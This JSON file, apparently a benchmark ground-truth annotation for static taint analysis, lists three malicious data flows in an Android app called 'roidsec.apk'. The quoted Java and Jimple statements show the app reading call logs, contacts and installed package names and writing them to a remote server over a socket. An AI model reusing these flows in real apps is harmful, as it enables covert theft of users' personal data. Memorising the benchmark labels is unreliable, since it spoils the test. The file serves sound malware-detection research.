@@ -1,0 +1,168 @@
+{
+  "fileName": "roidsec.apk",
+  "day": "2019-08-29",
+  "findings": [
+    {
+      "source": {
+        "statement": "Cursor cursor = getContentResolver().query(Calls.CONTENT_URI, new String[]{\"number\", \"name\", \"type\", \"date\", \"duration\"}, null, null, \"date DESC\");",
+        "methodName": "private String getCallLogs()",
+        "className": "cn.phoneSync.PhoneSyncService",
+        "lineNo": 643,
+        "targetName": "query",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r7 = virtualinvoke $r4.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r5, $r6, null, null, \"date DESC\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "outStream.write((\"result_Call\" + getCallLogs()).getBytes(\"GBK\"));",
+        "methodName": "public void BackConnTask()",
+        "className": "cn.phoneSync.PhoneSyncService",
+        "lineNo": 173,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r8.<java.io.OutputStream: void write(byte[])>($r12)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "String phoneNumber = cursor.getString(0);",
+          "methodName": "private String getCallLogs()",
+          "className": "cn.phoneSync.PhoneSyncService",
+          "lineNo": 648,
+          "ID": 1
+        },
+        {
+          "statement": "sb.append(phoneNumber).append(\"|\").append(name).append(\"|\").append(type).append(\"|\").append(time).append(\"|\").append(cursor.getString(4)).append(\"~\");",
+          "methodName": "private String getCallLogs()",
+          "className": "cn.phoneSync.PhoneSyncService",
+          "lineNo": 646,
+          "ID": 2
+        },
+        {
+          "statement": "return sb.toString();",
+          "methodName": "private String getCallLogs()",
+          "className": "cn.phoneSync.PhoneSyncService",
+          "lineNo": 677,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "pathConstraints": true
+      },
+      "ID": 1,
+      "description": "This malicious flow reads phone numbers from call logs and sends to a remote server via socket."
+    },
+    {
+      "source": {
+        "statement": "Cursor cursor = getContentResolver().query(Contacts.CONTENT_URI, null, null, null, null);",
+        "methodName": "private String getContactInfo()",
+        "className": "cn.phoneSync.PhoneSyncService",
+        "lineNo": 682,
+        "targetName": "query",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r2.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r3, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "outStream.write((\"result_Contact\" + getContactInfo()).getBytes(\"GBK\"));",
+        "methodName": "public void BackConnTask()",
+        "className": "cn.phoneSync.PhoneSyncService",
+        "lineNo": 178,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r8.<java.io.OutputStream: void write(byte[])>($r12)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "sb.append(\"|\").append(phones.getString(phones.getColumnIndex(\"data1\")));",
+          "methodName": "private String getContactInfo()",
+          "className": "cn.phoneSync.PhoneSyncService",
+          "lineNo": 693,
+          "ID": 1
+        },
+        {
+          "statement": "return sb.toString();",
+          "methodName": "private String getContactInfo()",
+          "className": "cn.phoneSync.PhoneSyncService",
+          "lineNo": 708,
+          "ID": 2
+        }
+      ],
+      "attributes": {
+        "appendToString": true
+      },
+      "ID": 2,
+      "description": "This malicious flow reads phone numbers from contact and sends to aremote server via socket."
+    },
+    {
+      "source": {
+        "statement": "String packagename = packageInfo.packageName;",
+        "methodName": "private String getInstalledApp()",
+        "className": "cn.phoneSync.PhoneSyncService",
+        "lineNo": 604,
+        "targetName": "packageName",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r4.<android.content.pm.PackageManager: java.util.List getInstalledPackages(int)>(0)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "outStream.write((\"result_InstalledApp\" + getInstalledApp()).getBytes(\"GBK\"));",
+        "methodName": "public void BackConnTask()",
+        "className": "cn.phoneSync.PhoneSyncService",
+        "lineNo": 193,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r8.<java.io.OutputStream: void write(byte[])>($r12)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "sb.append(appname).append(\"|\").append(packagename).append(\"|\").append(versionName).append(\"|\").append(versionCode).append(\"~\");",
+          "methodName": "private String getInstalledApp()",
+          "className": "cn.phoneSync.PhoneSyncService",
+          "lineNo": 600,
+          "ID": 1
+        },
+        {
+          "statement": "return sb.toString();",
+          "methodName": "private String getInstalledApp()",
+          "className": "cn.phoneSync.PhoneSyncService",
+          "lineNo": 614,
+          "ID": 2
+        }
+      ],
+      "attributes": {
+        "nonStaticField": true,
+        "pathConstraints": true
+      },
+      "ID": 3,
+      "description": "This malicious flow reads installed package name and sends to a remote server via socket."
+    }
+  ]
+}
